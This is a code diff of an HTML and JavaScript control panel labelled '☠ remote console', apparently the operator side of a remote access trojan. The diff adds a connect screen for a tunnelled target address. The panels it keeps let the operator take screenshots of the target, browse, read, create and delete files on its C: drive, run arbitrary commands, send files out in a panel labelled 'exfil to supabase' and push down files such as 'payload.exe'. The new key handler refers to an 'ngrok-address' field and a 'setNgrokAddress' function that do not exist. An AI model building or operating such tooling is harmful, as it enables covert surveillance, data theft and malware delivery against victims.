@@ -155,158 +155,297 @@
 			.status-dot.online {
 				background: #fff;
 			}
+			.status-dot.offline {
+				background: #ff4444;
+			}
 			hr {
 				border: none;
 				border-top: 1px solid #222;
 				margin: 12px 0;
 			}
+
+			/* CONNECT SCREEN */
+			#connect-screen {
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				min-height: 80vh;
+			}
+			#connect-screen .card {
+				width: 500px;
+				padding: 32px;
+			}
+			#connect-screen h1 {
+				text-align: center;
+				border-bottom: none;
+				margin-bottom: 24px;
+				font-size: 1.8rem;
+			}
+			#connect-screen .subtitle {
+				text-align: center;
+				color: #666;
+				font-size: 0.78rem;
+				text-transform: uppercase;
+				letter-spacing: 0.5px;
+				margin-bottom: 24px;
+			}
+			#connect-screen label {
+				margin-top: 0;
+			}
+
+			#connect-screen .connect-btn {
+				width: 100%;
+				padding: 12px;
+				font-size: 0.9rem;
+				margin-top: 16px;
+				background: #222;
+				border-color: #555;
+			}
+			#connect-screen .connect-btn:hover {
+				background: #444;
+				border-color: #aaa;
+			}
+			#connect-screen .error {
+				color: #ff4444;
+				text-align: center;
+				margin-top: 12px;
+				font-size: 0.8rem;
+			}
+
+			#main-screen {
+				display: none;
+			}
 		</style>
 	</head>
 	<body>
-		<div class="status-bar">
-			<div><span class="status-dot online"></span> connected</div>
-			<div>target: <span id="status-target">localhost:6969</span></div>
+		<!-- CONNECT SCREEN -->
+		<div id="connect-screen">
+			<div class="card">
+				<h1>☠ remote console</h1>
+				<div class="subtitle">connect to target</div>
+
+				<label>server address</label>
+				<input
+					type="text"
+					id="server-address"
+					value="http://localhost:6969"
+					placeholder="http://localhost:6969"
+				/>
+
+				<button class="connect-btn" onclick="connect()">connect</button>
+				<div id="connect-error" class="error"></div>
+			</div>
 		</div>
 
-		<h1>☠ remote console</h1>
-
-		<div class="grid">
-			<!-- SCREENSHOT -->
-			<div class="card full">
-				<h2>screenshot</h2>
-				<button onclick="takeScreenshot()">capture</button>
-				<div id="screenshot-output"></div>
+		<!-- MAIN SCREEN -->
+		<div id="main-screen">
+			<div class="status-bar">
+				<div>
+					<span class="status-dot online" id="status-dot"></span>
+					<span id="status-text">connected</span>
+				</div>
+				<div>
+					target: <span id="status-target">localhost:6969</span>
+				</div>
+				<div
+					style="margin-left: auto; cursor: pointer; color: #666"
+					onclick="disconnect()"
+				>
+					[disconnect]
+				</div>
 			</div>
 
-			<!-- DIRECTORY LISTING -->
-			<div class="card">
-				<h2>directory listing</h2>
-				<label>path (relative to c:\)</label>
-				<div class="row">
+			<h1>☠ remote console</h1>
+
+			<div class="grid">
+				<!-- SCREENSHOT -->
+				<div class="card full">
+					<h2>screenshot</h2>
+					<button onclick="takeScreenshot()">capture</button>
+					<div id="screenshot-output"></div>
+				</div>
+
+				<!-- DIRECTORY LISTING -->
+				<div class="card">
+					<h2>directory listing</h2>
+					<label>path (relative to c:\)</label>
+					<div class="row">
+						<input
+							type="text"
+							id="dir-path"
+							value=""
+							placeholder="Users\user\Desktop"
+						/>
+						<button onclick="listDir()">list</button>
+					</div>
+					<div id="dir-output" class="output">—</div>
+				</div>
+
+				<!-- READ FILE -->
+				<div class="card">
+					<h2>read file</h2>
+					<label>path (relative to c:\)</label>
+					<div class="row">
+						<input
+							type="text"
+							id="read-path"
+							value=""
+							placeholder="Users\user\Desktop\notes.txt"
+						/>
+						<button onclick="readFile()">read</button>
+					</div>
+					<div id="read-output" class="output">—</div>
+				</div>
+
+				<!-- CREATE FILE -->
+				<div class="card">
+					<h2>create file</h2>
+					<label>path (relative to c:\)</label>
 					<input
 						type="text"
-						id="dir-path"
+						id="create-path"
+						value=""
+						placeholder="Users\user\Desktop\hello.txt"
+					/>
+					<label>content</label>
+					<textarea
+						id="create-content"
+						placeholder="file contents..."
+					></textarea>
+					<button onclick="createFile()">create</button>
+					<div id="create-output" class="output">—</div>
+				</div>
+
+				<!-- DELETE FILE / FOLDER -->
+				<div class="card">
+					<h2>delete</h2>
+					<label>path (relative to c:\)</label>
+					<input
+						type="text"
+						id="delete-path"
+						value=""
+						placeholder="Users\user\Desktop\badfile.txt"
+					/>
+					<div class="row">
+						<button onclick="deleteFile()">delete file</button>
+						<button onclick="deleteFolder()">delete folder</button>
+					</div>
+					<div id="delete-output" class="output">—</div>
+				</div>
+
+				<!-- DOWNLOAD FILE -->
+				<div class="card">
+					<h2>download (exfil to supabase)</h2>
+					<label>path (relative to c:\)</label>
+					<div class="row">
+						<input
+							type="text"
+							id="download-path"
+							value=""
+							placeholder="Users\user\Desktop\secret.docx"
+						/>
+						<button onclick="downloadFile()">download</button>
+					</div>
+					<div id="download-output" class="output">—</div>
+				</div>
+
+				<!-- UPLOAD FILE -->
+				<div class="card">
+					<h2>upload (fetch from supabase)</h2>
+					<label>save path (relative to c:\)</label>
+					<input
+						type="text"
+						id="upload-path"
+						value=""
+						placeholder="Users\user\Desktop\"
+					/>
+					<label>file name in supabase</label>
+					<input
+						type="text"
+						id="upload-filename"
+						value=""
+						placeholder="payload.exe"
+					/>
+					<button onclick="uploadFile()">upload</button>
+					<div id="upload-output" class="output">—</div>
+				</div>
+
+				<!-- COMMAND EXECUTION -->
+				<div class="card full">
+					<h2>command execution</h2>
+					<label>command</label>
+					<input
+						type="text"
+						id="cmd-cmd"
+						value="whoami"
+						placeholder="ipconfig"
+					/>
+					<label>working dir (relative to c:\)</label>
+					<input
+						type="text"
+						id="cmd-path"
 						value=""
 						placeholder="Users\user\Desktop"
 					/>
-					<button onclick="listDir()">list</button>
+					<button onclick="runCmd()">execute</button>
+					<div id="cmd-output" class="output">—</div>
 				</div>
-				<div id="dir-output" class="output">—</div>
-			</div>
-
-			<!-- READ FILE -->
-			<div class="card">
-				<h2>read file</h2>
-				<label>path (relative to c:\)</label>
-				<div class="row">
-					<input
-						type="text"
-						id="read-path"
-						value=""
-						placeholder="Users\user\Desktop\notes.txt"
-					/>
-					<button onclick="readFile()">read</button>
-				</div>
-				<div id="read-output" class="output">—</div>
-			</div>
-
-			<!-- CREATE FILE -->
-			<div class="card">
-				<h2>create file</h2>
-				<label>path (relative to c:\)</label>
-				<input
-					type="text"
-					id="create-path"
-					value=""
-					placeholder="Users\user\Desktop\hello.txt"
-				/>
-				<label>content</label>
-				<textarea
-					id="create-content"
-					placeholder="file contents..."
-				></textarea>
-				<button onclick="createFile()">create</button>
-				<div id="create-output" class="output">—</div>
-			</div>
-
-			<!-- DELETE FILE / FOLDER -->
-			<div class="card">
-				<h2>delete</h2>
-				<label>path (relative to c:\)</label>
-				<input
-					type="text"
-					id="delete-path"
-					value=""
-					placeholder="Users\user\Desktop\badfile.txt"
-				/>
-				<div class="row">
-					<button onclick="deleteFile()">delete file</button>
-					<button onclick="deleteFolder()">delete folder</button>
-				</div>
-				<div id="delete-output" class="output">—</div>
-			</div>
-
-			<!-- DOWNLOAD FILE -->
-			<div class="card">
-				<h2>download (exfil to supabase)</h2>
-				<label>path (relative to c:\)</label>
-				<div class="row">
-					<input
-						type="text"
-						id="download-path"
-						value=""
-						placeholder="Users\user\Desktop\secret.docx"
-					/>
-					<button onclick="downloadFile()">download</button>
-				</div>
-				<div id="download-output" class="output">—</div>
-			</div>
-
-			<!-- UPLOAD FILE -->
-			<div class="card">
-				<h2>upload (fetch from supabase)</h2>
-				<label>save path (relative to c:\)</label>
-				<input
-					type="text"
-					id="upload-path"
-					value=""
-					placeholder="Users\user\Desktop\"
-				/>
-				<label>file name in supabase</label>
-				<input
-					type="text"
-					id="upload-filename"
-					value=""
-					placeholder="payload.exe"
-				/>
-				<button onclick="uploadFile()">upload</button>
-				<div id="upload-output" class="output">—</div>
-			</div>
-
-			<!-- COMMAND EXECUTION -->
-			<div class="card full">
-				<h2>command execution</h2>
-				<label>command</label>
-				<input
-					type="text"
-					id="cmd-cmd"
-					value="whoami"
-					placeholder="ipconfig"
-				/>
-				<label>working dir (relative to c:\)</label>
-				<input
-					type="text"
-					id="cmd-path"
-					value=""
-					placeholder="Users\user\Desktop"
-				/>
-				<button onclick="runCmd()">execute</button>
-				<div id="cmd-output" class="output">—</div>
 			</div>
 		</div>
 
 		<script>
-			const BASE = "http://localhost:6969";
+			let BASE = "";
+
+			// ----- CONNECT SCREEN -----
+			function setAddress(addr) {
+				document.getElementById("server-address").value = addr;
+			}
+
+			async function connect() {
+				const addr = document
+					.getElementById("server-address")
+					.value.trim();
+				if (!addr) {
+					document.getElementById("connect-error").textContent =
+						"enter a server address";
+					return;
+				}
+
+				// Strip trailing slash
+				BASE = addr.replace(/\/+$/, "");
+
+				// Test connection
+				try {
+					const res = await fetch(BASE + "/", {
+						headers: { "ngrok-skip-browser-warning": "true" },
+					});
+					let text = await res.text();
+					text = text.replaceAll('"', "");
+					if (text !== "Target Connected") {
+						document.getElementById("connect-error").textContent =
+							"unexpected response: " + text;
+						return;
+					}
+				} catch (e) {
+					document.getElementById("connect-error").textContent =
+						"connection failed: " + e.message;
+					return;
+				}
+
+				// Switch to main screen
+				document.getElementById("connect-screen").style.display =
+					"none";
+				document.getElementById("main-screen").style.display = "block";
+				document.getElementById("status-target").textContent = BASE;
+			}
+
+			function disconnect() {
+				BASE = "";
+				document.getElementById("main-screen").style.display = "none";
+				document.getElementById("connect-screen").style.display =
+					"flex";
+				document.getElementById("connect-error").textContent = "";
+			}
 
 			// ----- UTILITY -----
 			async function api(url) {
@@ -340,10 +479,10 @@
 
 			// ----- DIRECTORY LISTING -----
 			async function listDir() {
-				const path = document.getElementById("dir-path").value;
+				const path = document.getElementById("dir-path").value || "";
 				try {
 					const res = await api(
-						`${BASE}/getdir?path=${encodeURIComponent(path)}`,
+						`${BASE}/getdir${path !== "" ? "?path=" + encodeURIComponent(path) : ""}`,
 					);
 					const data = await res.json();
 					show(
@@ -429,14 +568,15 @@
 					const res = await api(
 						`${BASE}/downloadfile?path=${encodeURIComponent(path)}`,
 					);
-					const text = await res.text();
-					// If Supabase returns a URL, show it
-					if (text.startsWith("http")) {
-						a = document.createElement("a");
-						a.href = text;
+					let text = await res.text();
+					const url = text.replaceAll('"', "");
+					if (url.startsWith("http")) {
+						const a = document.createElement("a");
+						a.href = url;
+						a.target = "_blank";
 						a.click();
 					} else {
-						show("download-output", text, false);
+						show("download-output", url, false);
 					}
 				} catch (e) {
 					show("download-output", e.message, false);
@@ -477,6 +617,24 @@
 					show("cmd-output", e.message, false);
 				}
 			}
+
+			// Enter key on ngrok field triggers connect
+			document
+				.getElementById("ngrok-address")
+				.addEventListener("keydown", function (e) {
+					if (e.key === "Enter") {
+						setNgrokAddress();
+						connect();
+					}
+				});
+
+			document
+				.getElementById("server-address")
+				.addEventListener("keydown", function (e) {
+					if (e.key === "Enter") {
+						connect();
+					}
+				});
 		</script>
 	</body>
 </html>
